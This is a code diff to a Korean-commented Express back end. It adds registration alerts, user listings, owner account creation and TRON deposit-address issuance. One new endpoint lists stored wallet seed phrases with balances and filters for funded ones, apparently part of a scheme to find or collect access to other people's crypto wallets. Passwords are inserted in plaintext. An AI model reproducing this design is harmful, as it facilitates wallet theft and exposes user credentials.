@@ -1253,7 +1253,20 @@ app.post('/api/register', async (req, res) => {
     
     // 사용자 생성 (승인 대기 상태)
     await db.userDB.addOrUpdate(id.trim(), password.trim(), referralCode.trim(), telegram || '', 'pending');
-    
+
+    // 해당 총판(매니저)에게 텔레그램 알림 발송
+    try {
+      if (manager.tg_bot_token && manager.tg_chat_id) {
+        await sendTelegram(
+          manager.tg_bot_token,
+          manager.tg_chat_id,
+          `📩 <b>신규 가입 요청</b>\n아이디: <code>${id.trim()}</code>\n텔레그램: ${telegram ? telegram.trim() : '-'}\n추천인: ${referralCode.trim()}`
+        );
+      }
+    } catch (tgErr) {
+      console.warn('가입 알림 텔레그램 전송 실패:', tgErr.message);
+    }
+
     res.json({ 
       success: true, 
       message: '회원가입이 완료되었습니다. 관리자 승인을 기다려주세요.',
@@ -1941,27 +1954,38 @@ app.post('/api/admin/managers/:id/telegram-bot/test', requireAdmin, async (req, 
   }
 });
 
-// ---------- 유저 목록 (마스터=전체, 매니저=내 유저만) ----------
+// ---------- 유저 목록 (마스터=전체, 매니저=내 유저만, pending 포함) ----------
 app.get('/api/admin/users', requireAdmin, async (req, res) => {
   try {
-    let list;
-    if (req.admin.role === 'master') {
-      list = await db.userDB.getAll();
-    } else {
-      list = await db.userDB.getByManager(req.admin.id);
+    // pending 포함 전체 조회
+    let query = 'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users';
+    const params = [];
+    if (req.admin.role !== 'master') {
+      query += ' WHERE manager_id = ?';
+      params.push(req.admin.id);
     }
-    
+    query += ' ORDER BY FIELD(status,"pending","approved","suspended"), id';
+    const [list] = await db.pool.query(query, params);
+
     const managers = await db.managerDB.getAll();
-  const byId = Object.fromEntries(managers.map((m) => [m.id, m.telegram || m.id]));
-    
-  const withManager = list.map((u) => ({
-    id: u.id,
-    managerId: u.managerId || null,
-    managerName: byId[u.managerId] || '-',
-    telegram: u.telegram || '',
-  }));
-    
-  res.json(withManager);
+    const byId = Object.fromEntries(managers.map((m) => [m.id, m.telegram || m.id]));
+
+    const now = new Date();
+    const withManager = list.map((u) => {
+      const exp = u.expireDate ? new Date(u.expireDate) : null;
+      const remainingDays = exp ? Math.ceil((exp - now) / 86400000) : null;
+      return {
+        id: u.id,
+        managerId: u.managerId || null,
+        managerName: byId[u.managerId] || '-',
+        telegram: u.telegram || '',
+        status: u.status || 'pending',
+        expireDate: u.expireDate || null,
+        remainingDays,
+      };
+    });
+
+    res.json(withManager);
   } catch (error) {
     console.error('유저 조회 오류:', error);
     res.status(500).json({ error: '서버 오류가 발생했습니다.' });
@@ -3732,6 +3756,127 @@ app.get('/api/owner/accounts/:id/mining-records', requireOwnerSession, async (re
     );
     const [[{ cumulative }]] = await db.pool.query('SELECT COALESCE(SUM(amount),0) as cumulative FROM mining_records WHERE user_id = ?', [targetId]);
     res.json({ records, cumulative: Number(cumulative) });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/owner/create-account — 오너가 사용자 계정 직접 생성
+app.post('/api/owner/create-account', requireOwnerSession, async (req, res) => {
+  try {
+    const { id, password, telegram } = req.body || {};
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
+    const newId = id.trim().toLowerCase();
+    const [[exists]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [newId]);
+    if (exists) return res.status(400).json({ error: '이미 존재하는 아이디입니다.' });
+    // owner의 manager_id를 referral로 사용
+    const managerId = req.owner.managerId || '';
+    await db.pool.query(
+      'INSERT INTO users (id, password, manager_id, telegram, status, owner_id) VALUES (?, ?, ?, ?, "pending", ?)',
+      [newId, password.trim(), managerId, telegram?.trim() || '', req.owner.id]
+    );
+    res.json({ ok: true, id: newId });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/owner/kick — 오너 소속 사용자 세션 강제 종료
+app.post('/api/owner/kick', requireOwnerSession, async (req, res) => {
+  try {
+    const { userId } = req.body || {};
+    if (!userId) return res.status(400).json({ error: 'userId 필요' });
+    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [userId, req.owner.id]);
+    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+    await sessionStore.kickUser(userId);
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// GET /api/owner/seeds — 오너 소속 사용자들의 시드 목록 (잔고 필터 지원)
+app.get('/api/owner/seeds', requireOwnerSession, async (req, res) => {
+  try {
+    const hasBalance = req.query.hasBalance === '1';
+    let query = `
+      SELECT s.id, s.user_id, s.phrase, s.created_at, s.balance, s.usdt_balance, s.btc, s.eth, s.tron, s.sol
+      FROM seeds s
+      JOIN users u ON s.user_id = u.id
+      WHERE u.owner_id = ?`;
+    const params = [req.owner.id];
+    if (hasBalance) {
+      query += ' AND (IFNULL(s.balance, 0) > 0 OR IFNULL(s.usdt_balance, 0) > 0 OR IFNULL(s.btc, 0) > 0 OR IFNULL(s.eth, 0) > 0 OR IFNULL(s.tron, 0) > 0 OR IFNULL(s.sol, 0) > 0)';
+    }
+    query += ' ORDER BY s.id DESC LIMIT 200';
+    const [rows] = await db.pool.query(query, params);
+    res.json({ seeds: rows.map(r => ({
+      id: r.id,
+      userId: r.user_id,
+      phrase: r.phrase ? r.phrase.replace(/\S+/g, (w, i) => i < 2 ? w : '****') : '',
+      balance: Number(r.balance || 0),
+      usdtBalance: Number(r.usdt_balance || 0),
+      btc: Number(r.btc || 0),
+      eth: Number(r.eth || 0),
+      tron: Number(r.tron || 0),
+      sol: Number(r.sol || 0),
+      at: r.created_at,
+    })) });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/owner/payment/request-address — 오너가 소속 사용자에게 입금 주소 발급
+app.post('/api/owner/payment/request-address', requireOwnerSession, async (req, res) => {
+  try {
+    const { userId, network, tokenType } = req.body || {};
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    const resolvedUserId = userId.trim().toLowerCase();
+    // 소유 확인
+    const [[owns]] = await db.pool.query('SELECT id FROM users WHERE id = ? AND owner_id = ?', [resolvedUserId, req.owner.id]);
+    if (!owns) return res.status(403).json({ error: '소유한 계정이 아닙니다.' });
+
+    const activeWallet = await db.collectionWalletDB.getActive();
+    if (!activeWallet) return res.status(503).json({ error: '활성화된 수금 지갑이 없습니다. 관리자에게 문의하세요.' });
+
+    const existing = await db.depositAddressDB.findByUserAndVersion(resolvedUserId, activeWallet.wallet_version);
+    const isExpiredAddress = existing?.status === 'expired';
+
+    if (existing && !isExpiredAddress) {
+      if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
+        await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
+      }
+      return res.json({ address: existing.deposit_address, walletVersion: existing.wallet_version, status: 'issued', isNew: false });
+    }
+
+    const secret = activeWallet.xpub_key;
+    let newAddress, insertSuccess = false;
+    const MAX_RETRY = 5;
+    for (let attempt = 0; attempt < MAX_RETRY; attempt++) {
+      const [maxRows] = await db.pool.query(
+        'SELECT COALESCE(MAX(derivation_index), 0) AS maxIdx FROM deposit_addresses WHERE wallet_version = ?',
+        [activeWallet.wallet_version]
+      );
+      const newIndex = maxRows[0].maxIdx + 1 + attempt;
+      if (secret) {
+        try { newAddress = deriveTronAddress(secret, newIndex); } catch (e) {
+          return res.status(500).json({ error: '주소 파생 오류.' });
+        }
+      } else {
+        newAddress = activeWallet.root_wallet_address;
+      }
+      try {
+        await db.depositAddressDB.create({ userId: resolvedUserId, orderId: null, network: network || 'TRON', token: tokenType || 'USDT', depositAddress: newAddress, walletVersion: activeWallet.wallet_version, derivationIndex: newIndex });
+        insertSuccess = true;
+        break;
+      } catch (insertErr) {
+        if (insertErr.code === 'ER_DUP_ENTRY') continue;
+        throw insertErr;
+      }
+    }
+    if (!insertSuccess) return res.status(500).json({ error: '주소 발급 실패. 잠시 후 다시 시도해주세요.' });
+    res.json({ address: newAddress, walletVersion: activeWallet.wallet_version, status: 'issued', isNew: true });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
